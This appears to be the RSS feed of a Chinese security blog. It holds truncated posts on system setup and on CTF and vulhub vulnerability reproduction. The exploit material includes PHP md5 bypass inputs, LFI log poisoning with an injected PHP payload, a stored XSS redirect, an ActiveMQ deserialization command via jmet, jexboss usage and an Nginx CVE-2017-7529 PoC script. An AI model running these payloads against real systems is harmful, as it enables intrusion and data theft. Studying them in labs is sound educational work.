<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Atmet</title>
    <link>https://oopsdc.tk/</link>
    <description>Recent content on Atmet</description>
    <image>
      <url>https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 20 Aug 2021 18:32:54 +0800</lastBuildDate><atom:link href="https://oopsdc.tk/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Vulhub环境搭建</title>
      <link>https://oopsdc.tk/post/vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Fri, 20 Aug 2021 18:32:54 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <description>安装环境  Ubuntu 20.04  环境配置  docker docker-compose  更换系统源 备份原文件：
mv /etc/apt/source.list /etc/apt/source.list.bak 使用以下任一命令创建并编辑source.list文件：
gedit /etc/apt/source.list vi /etc/apt/source.list vim /etc/apt/source.list	// 需使用 apt install vim 命令安装 文件内容如下：
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# deb-src https://mirrors.</description>
    </item>
    
    <item>
      <title>GitHub不再支持密码验证解决方案</title>
      <link>https://oopsdc.tk/post/github%E4%B8%8D%E5%86%8D%E6%94%AF%E6%8C%81%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</link>
      <pubDate>Thu, 19 Aug 2021 08:46:55 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/github%E4%B8%8D%E5%86%8D%E6%94%AF%E6%8C%81%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</guid>
      <description>问题描述 在更新博客push本地资源时遇到如下报错：
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.大意就是GitHub从13号起不再支持密码验证，需要使用个人token，官方解释是为了安全。
解决方案 进入GitHub首页后点击右上角的个人头像，选择Settings，在左侧选择Developer settings，然后选择Personal access tokens，选中之后点击Generate new token，我们可以设置token名、有效期及token的权限范围。仅需要仓库部署的话，我们就只需勾选repo，翻到最下面点击Gererate token。
然后保存好生成的token，因为退出页面后将不再显示，可以通过重新生成来重新获取。然后在push项目时，将输入的密码改为我们生成的token即可。
 本文链接:GitHub不再支持密码验证解决方案 | Atmet
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>Kali安装Parallels Tools</title>
      <link>https://oopsdc.tk/post/kali%E5%AE%89%E8%A3%85parallels-tools/</link>
      <pubDate>Wed, 18 Aug 2021 22:45:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/kali%E5%AE%89%E8%A3%85parallels-tools/</guid>
      <description>环境配置 本文环境信息如下：
 Parallel Desktop 16 Business 16.5.0 (49183) Kali Linux 2021.2 64-Bit  系统安装 安装配置 安装Kali Linux的时候Parallels Desktop无法识别操作系统，需要我们手动选择Other Linux下的Kali Linux。
配置选项因人而异，此处不细讲。
更换国内源 # 备份原文件 mv /etc/apt/source.list /etc/apt/source.list.bak # 更换为清华源 vim /etc/apt/source.list # 输入以下内容 &amp;#34;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&amp;#34; &amp;#34;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&amp;#34; 安装Parallels Tools 把鼠标移到窗口的右上，有一个黄色的感叹符号，点击即可安装Parallels Tools。
# 检测光盘是否挂载成功 mount | grep iso9660 # 将安装文件拷贝至本地，此处的dirname为自己创建的目录名称 mkdir ~/&amp;lt;dirname&amp;gt; &amp;amp;&amp;amp; cp -r /media/cdrom0/* ~/&amp;lt;dirname&amp;gt; # 安装Parallels Tools cd ~/&amp;lt;dirname&amp;gt; &amp;amp;&amp;amp; .</description>
    </item>
    
    <item>
      <title>MD5()函数绕过</title>
      <link>https://oopsdc.tk/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</link>
      <pubDate>Fri, 13 Aug 2021 20:27:10 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</guid>
      <description>示例代码:
if (md5($_POST[&amp;#39;md51&amp;#39;]) == md5($_POST[&amp;#39;md52&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;md51&amp;#39;] != $_POST[&amp;#39;md52&amp;#39;]) 弱类型绕过 PHP在处理哈希字符串时，会把每一个0E开头的哈希值解释为0，所以若两个不同密码进行哈希后以0E开头，则会被认为值均为0，从而判等。
md5加密后开头为0E的值:
QNKCDZO240610708s878926199as155964671as214587387as214587387a以示例代码为例，分别给md51和md52赋表中不同的值。经过md5加密后，值均为0，而原始值又不同，顺利绕过if判断。
数组绕过 md5()函数无法处理数组，会对传入的数组返回NULL，即数组经过md5加密后均得到NULL。
我们仅需传入如下数据即可，数组内容随意:
md51[]=1&amp;amp;md52[]=2  本文链接:MD5()函数绕过 | Atmet (oopsdc.tk)
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>BUUCTF</title>
      <link>https://oopsdc.tk/post/buuctf/</link>
      <pubDate>Fri, 13 Aug 2021 10:08:21 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/buuctf/</guid>
      <description>Basic Linux Labs  2020年10月24日 更新：目前所有靶机均能直接访问互联网。
点击启动靶机可以启动一台安装好了 LAMP 的机器。
并且这台机器位于靶机内网，所有动态靶机均可直接通过主机名访问这台机器。
但由于目前一个账户只能同时启动一台靶机，您如果有需要建议浏览器开一个隐私窗口，注册一个新账号来启动这个靶机。
ssh 用户名：root 密码：123456 地址和端口为动态分配的。
 开启环境后按照题目给定地址和端口使用SSH连接即可。
连接上云主机后使用ls命令，发现当前用户家目录下啥也没有，再使用cd ..命令切换到根目录下看看，发现flag.txt文件。
也可直接使用cat /flag.txt命令查看flag。
BUU LFI COURSE 1 启动环境后得到如下PHP代码:
&amp;lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&amp;#39;file&amp;#39;])) { $str = $_GET[&amp;#39;file&amp;#39;]; include $_GET[&amp;#39;file&amp;#39;]; } 本地文件包含，通过file参数进行传参，可在URL后构造参数?file=/flag查看flag。
拓展 通过Wappalyzer插件可以发现网站使用了nginx服务，尝试访问nginx访问日志:
?file=/var/log/nginx/access.log页面回显出我们刚才的访问记录，接下来我们使用bp抓包尝试写入phpinfo:
通过在User-Agent字段最后插入aaaaaaa&amp;lt;?php phpinfo();?&amp;gt;bbbbbbb传入phpinfo()，刷新页面后检查是否传入成功。
Request请求包如下:
GET /?file=/var/log/nginx/access.log HTTP/1.1Host: 611bfd3e-480b-4a58-95d6-ee0dab70b4f2.node4.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.</description>
    </item>
    
    <item>
      <title>ATT&amp;CK实战一</title>
      <link>https://oopsdc.tk/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</link>
      <pubDate>Wed, 21 Jul 2021 14:34:21 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</guid>
      <description>一、环境搭建 1.1 下载虚拟机文件 自行搜索。
1.2 环境介绍 本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
Kali:自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 &amp;lt;ip&amp;gt;即可。
Win7:双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
Win2k3:只有内网网卡，IP:192.168.52.138，使用VMnet2。
Win2k8 R2:只有内网网卡，IP:192.168.52.141，使用VMnet2。
拓扑图如下:
![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)
安装完成之后在Win7主机上打开phpstudy开启Web服务。
二、信息收集 2.1 探测存活主机 命令:
nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确)结果:
Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.</description>
    </item>
    
    <item>
      <title>浅析APNs推送机制</title>
      <link>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</link>
      <pubDate>Tue, 20 Jul 2021 17:19:55 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</guid>
      <description>APNs简述 Apple Push Notification server(APNs)，即苹果推送通知服务。
APNs出现需求 由于移动设备内存、CPU、电池容量等各种因素，iOS不允许APP进程常驻后台(时限大概为10min)。
当用户主动关闭APP或后台APP进入后台达到限定时长后，意味着该APP进程的结束，在一定程度上保证了手机的流畅度与使用时长。但这也同时意味着服务器无法主动和用户交互(如实时推送消息)，为了解决这个限制，苹果推出了APNs，允许设备和服务器分别与苹果的推送服务器保持长连接状态。
iOS通知 iOS通知分为本地通知和远程通知两类，APNs是远程通知功能的核心。
本地通知 由本地应用触发，一般是基于时间的通知形式，如闹钟、日历、待办事项等。
远程通知 通过自建服务器推送消息的通知形式。
APNs推送流程 苹果官方APNs概述:Local and Remote Notification Programming Guide: APNs Overview (apple.com)
以下为APNs推送流程图:
 Provider:自建应用服务器 APNs:苹果APNs推送通知服务器 Device:苹果设备 Client App:应用  大致流程可分为以下4点:
 苹果设备安装应用后会向APNs服务器进行注册，注册成功后APNs服务器返回一个deviceToken，且二者之间会维持一个基于SSL协议的TCP流通讯的长连接。 拿到deviceToken后设备会将其发送至自建应用服务器 有消息需要被推送时，自建服务器会将消息按指定格式结合deviceToken一并打包发送给APNs。 APNs将新消息推送至设备，并在设备屏幕上显示出来(因为设备和服务器之间维持了一个长连接)  结合上述过程可以发现，真正完成推送的是APNs服务器，消息一定是由APNs服务器推送给我们的设备，自建应用服务器只是将需要推送的消息告诉APNs服务器。至于如何维护消息队列或如何保证消息能被推送到指定设备上，这些功能都是由APNs实现的。
deviceToken deviceToken是一个APP安装在设备上的唯一标识符，一个APP在不同设备上的deviceToken不同，同一台设备重新安装同一个APP后deviceToken也会不同。
项目代码AppDelegate中有一个回调方法，当APNs注册成功后通过该回调方法可以获取到返回的deviceToken。
- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken APNs拿到这个包之后会验证包结构是否正确，验证无误后会提取其中的消息，再将消息推送至指定设备。
消息体结构如下:
{ &amp;#34;aps&amp;#34;:{ &amp;#34;alert&amp;#34;:{	// 显示在用户设备上的推送标题内容 &amp;#34;title&amp;#34;:&amp;#34;Test Request&amp;#34;, &amp;#34;body&amp;#34;:&amp;#34;This is a test msg.&amp;#34;, }, &amp;#34;badge&amp;#34;:5,	// 显示的数量(整形类型)，是在应用icon右上角显示的数量，提示有几条未读信息 &amp;#34;sound&amp;#34;:&amp;#34;default&amp;#34;	// 推送消息声 } } 其实这就是一个JSON结构体，上述代码只是一种简单消息体，详情可见苹果官方文档:Local and Remote Notification Programming Guide: Creating the Remote Notification Payload (apple.</description>
    </item>
    
    <item>
      <title>Arm开发板联网配置</title>
      <link>https://oopsdc.tk/post/arm%E5%BC%80%E5%8F%91%E6%9D%BF%E8%81%94%E7%BD%91%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Tue, 20 Jul 2021 12:17:34 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/arm%E5%BC%80%E5%8F%91%E6%9D%BF%E8%81%94%E7%BD%91%E9%85%8D%E7%BD%AE/</guid>
      <description>文章背景 使用S5P6818开发板时，有业务上云的需求，遂有本文，内容较少，仅涉及联网部分。
问题描述  插上网线后无法获取IP 配置静态IP后无法ping通外网  解决方案 分两步解决。
1.配置静态IP 方法一
命令行配置:
ifconfig eth0 &amp;lt;ip&amp;gt; netmask &amp;lt;netmask&amp;gt; 方法二
写配置文件:
vi /etc/init.d/rcS # 网卡开机自启 ifconfig eth0 up ifconfig eth0 &amp;lt;ip&amp;gt; netmask &amp;lt;netmask&amp;gt; 2.配置网关及DNS服务器 完成第一步后，可以ping通局域网下的主机，但无法ping通外网，出现如下报错:
sendto: Network is unreachable使用route命令查看路由表:
Kernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface10.7.150.0 * 255.255.255.0 U 0 0 0 eth0发现没有网关，配置网关:
route add default gw 10.7.150.1再使用route命令验证一下，确认配好。
之后便要配置DNS解析，在/etc目录下新建一个resolv.conf配置文件，内容如下:
#114 DNS服务器nameserver 114.114.114.114 #微软 DNS服务器nameserver 233.</description>
    </item>
    
    <item>
      <title>utterances博客评论插件</title>
      <link>https://oopsdc.tk/post/utterances%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/</link>
      <pubDate>Tue, 20 Jul 2021 09:10:00 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/utterances%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/</guid>
      <description>概述 utterances是一个基于GitHub issue，拥有多种主题的开源小组件，本文将简述使用如何在hugo博客部署utterances。
配置过程 新建仓库 新建一个公开的仓库，用于存放评论，名字随意。作者在此处创建一个名为utterances的公开仓库。
安装utterances GitHub Apps - utterances
点击安装即可，选择仓库:
安装完成后会自动跳转到官方页面。
在文件中添加插件 官方文档:utterances
修改footer.html文件，以PaperMod主题为例:
&amp;lt;footer class=&amp;#34;footer&amp;#34;&amp;gt; {{- if .Site.Copyright }} &amp;lt;span&amp;gt;{{ .Site.Copyright | markdownify }}&amp;lt;/span&amp;gt; {{- else }} &amp;lt;span&amp;gt;&amp;amp;copy; {{ now.Year }} &amp;lt;a href=&amp;#34;{{ &amp;#34;&amp;#34; | absLangURL }}&amp;#34;&amp;gt;{{ .Site.Title }}&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; {{- end }} &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Powered by &amp;lt;a href=&amp;#34;https://gohugo.io/&amp;#34; rel=&amp;#34;noopener noreferrer&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;Hugo&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Theme &amp;lt;a href=&amp;#34;https://git.io/hugopapermod&amp;#34; rel=&amp;#34;noopener&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;PaperMod&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;script src=&amp;#34;https://utteranc.es/client.js&amp;#34; repo=&amp;#34;oopsdc/utterances&amp;#34; issue-term=&amp;#34;title&amp;#34; theme=&amp;#34;github-light&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34; async&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;/footer&amp;gt; 运行命令hugo server进入一篇文章即可查看评论插件效果。</description>
    </item>
    
    <item>
      <title>ProxyChains</title>
      <link>https://oopsdc.tk/post/proxychains/</link>
      <pubDate>Fri, 09 Jul 2021 22:24:59 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/proxychains/</guid>
      <description>概述 ProxyChains是一个Linux和Unix下的代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，且可配置多个代理。
ProxyChains通过用户自定义的代理列表强制连接指定的应用程序。
本文简述kali下如何通过ProxyChains使用Windows主机代理。
相关资料 GitHub项目地址 ProxyChains:haad/proxychains: proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: &amp;ldquo;user/pass&amp;rdquo; for SOCKS4/5, &amp;ldquo;basic&amp;rdquo; for HTTP. (github.com)
ProxyChains-ng:rofl0r/proxychains-ng: proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.</description>
    </item>
    
    <item>
      <title>从0到1-CTFer成长之路</title>
      <link>https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</link>
      <pubDate>Sat, 03 Jul 2021 18:59:29 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</guid>
      <description>平台地址:N1BOOK平台-Nu1L Team
第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。
 环境搭建 docker-compose.yml:
version: &amp;#39;3.2&amp;#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:
docker-compose up -d解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:
User-agent: *Disallow:/flag1_is_her3_fun.txt访问flag1_is_her3_fun.txt，获得第一部分flag。
剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。
粗心的小李  Des:看看能不能找到信息吧?
 环境搭建 docker-compose.yml:
version: &amp;#39;3.2&amp;#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:
docker-compose up -d解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)
使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。
SQL注入 SQL注入-1  Des:N/A。
 环境搭建 docker-compose.yml:
version: &amp;#39;3.2&amp;#39; services: web: image: registry.</description>
    </item>
    
    <item>
      <title>自定义GitHub个人资料</title>
      <link>https://oopsdc.tk/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/</link>
      <pubDate>Thu, 01 Jul 2021 21:33:33 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/</guid>
      <description>概述 想自定义一下GitHub的个人资料自述文件，遂有本文。
官方文档:管理个人资料自述文件 - GitHub Docs
关于自述文件:关于自述文件 - GitHub Docs
基本要求  创建一个与用户名相同的公开仓库 仓库根目录包含README.md文件 README.md文件不能为空  实现步骤 1.添加个人资料自述文件 1.新建仓库 在任意页面点击右上角的+号创建一个与自己用户名相同的仓库。当输入自己的用户名时，会出现一个小彩蛋。
2.添加仓库说明(可选) 3.设置仓库为公共属性 4.使用自述文件初始化仓库 5.创建仓库并编辑README文档 生成的自述文件已由模板预先填充，也可自定义表情、符号。
表情符号清单:🎁 Emoji cheat sheet for GitHub, Basecamp, Slack &amp;amp; more (webfx.com)
在想要换行的文本前后加上&amp;lt;br&amp;gt;和&amp;lt;/br&amp;gt;即可，如:
&amp;lt;br&amp;gt;This is test&amp;lt;/br&amp;gt; 2.删除个人资料自述文件 以下任一满足，个人资料自述文件就将会被删除:
 自述文件为空或不存在 仓库为私有仓库 仓库名与用户名不匹配   本文链接:自定义GitHub个人资料 | Atmet (oopsdc.tk)
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>信息收集</title>
      <link>https://oopsdc.tk/post/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
      <pubDate>Fri, 25 Jun 2021 15:36:18 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
      <description>信息收集概念 进行渗透测试之前，最重要的一步就是信息收集。
信息收集的主要内容:收集服务器配置信息、网站敏感信息等，包括域名、子域名信息、目标网站系统CMS指纹、目标网站真实IP、开放端口等。
1、收集域名信息 知道目标域名后，第一件事就是获取域名注册信息，包括域名DNS服务器信息及注册人联系信息等。
Whois命令查询 概念:Whois是一个标准互联网协议，可用于收集网络注册信息，如注册域名、IP等。
原理:Whois就是一个用于查询域名是否被注册及注册域名详细信息的数据库。
作用:获得注册人姓名和邮箱，通过社工进一步获取其它信息。
用法:
whois baidu.com	在线Whois查询网站:
站长工具_whois查询工具_爱站网 (aizhan.com)
域名Whois查询 - 站长之家 (chinaz.com)
VirusTotal
2、查询备案信息 概念:网站备案是工具国家法律法规规定，需要网站所有者向国家有关部门申请的备案。这是国家信息产业部对网站的一种管理。
注意:若网站搭建在其他国家，则不需进行备案。
在线备案信息查询网站:
天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)
3、收集敏感信息 搜索关键字 通过搜索引擎构造特殊关键字语法来搜索互联网上的相关敏感信息。还可用其来收集数据库文件、SQL注入、配置信息、源码泄露、未授权访问和robots.txt等敏感信息。
常用搜索语法(各搜索引擎大同小异):
   语法 作用     Site 指定域名   Inurl URL存在关键字的网页   Intext 网页正文中的关键字   Filetype 指定文件类型   Intitle 网页标题中的关键字   link link:baidu.com 表示返回所有和baidu.com做了链接的URL   Info 查找指定站点的基本信息   cache 搜索Google中关于某些内容的缓存    一般可以把语法结合使用以获得更准确的信息。</description>
    </item>
    
    <item>
      <title>Apache漏洞复现</title>
      <link>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本中的airflow webserver服务存在跨站脚本漏洞，漏洞源于WEB应用缺少对客户端数据的正确验证，攻击者可利用该漏洞执行客户端代码。
影响版本 Apache Airflow 1.10.3以下版本。
复现思路 漏洞复现 访问/admin/dagrun/(默认不需要密码)
创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例:
&amp;lt;script&amp;gt;_a=&amp;#34;https://www.baidu.com&amp;#34;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location=_a&amp;lt;/script&amp;gt; 能直接造成存储型XSS。
ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。
影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
复现思路 1.构造(可使用ysoserial)可执行命令的序列化对象。
2.作为一个消息，发送给目标61616端口。
3.访问web管理页面，读取消息，触发漏洞。
漏洞复现 使用jmet进行漏洞利用:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.c.j.t.JMSTarget [main] Sent gadget &amp;#34;ROME&amp;#34; with command: &amp;#34;touch /tmp/vuln&amp;#34; INFO d.</description>
    </item>
    
    <item>
      <title>JBoss漏洞复现</title>
      <link>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
影响版本 JBoss AS 4.x及之前。
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具:joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&amp;lt;ip&amp;gt;:8080 成功利用漏洞执行命令。
 本文链接:JBoss漏洞复现 | Atmet (oopsdc.tk)
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>Nginx漏洞复现</title>
      <link>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
影响版本 Nginx 0.5.6 ~ 1.13.2
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&amp;lt;ip&amp;gt;:8080正常即可。
POC已经在当前目录中给出来，文件名poc.py:
#!/usr/bin/env python import sys import requests if len(sys.argv) &amp;lt; 2: print(&amp;#34;%surl&amp;#34; % (sys.argv[0])) print(&amp;#34;eg: python %shttp://your-ip:8080/&amp;#34; % (sys.argv[0])) sys.exit() headers = { &amp;#39;User-Agent&amp;#39;: &amp;#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&amp;#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[&amp;#39;Range&amp;#39;] = &amp;#34;bytes=-%d,-%d&amp;#34; % ( n, 0x8000000000000000 - n) r = requests.</description>
    </item>
    
    <item>
      <title>服务器应用漏洞</title>
      <link>https://oopsdc.tk/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</guid>
      <description>OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。
影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:
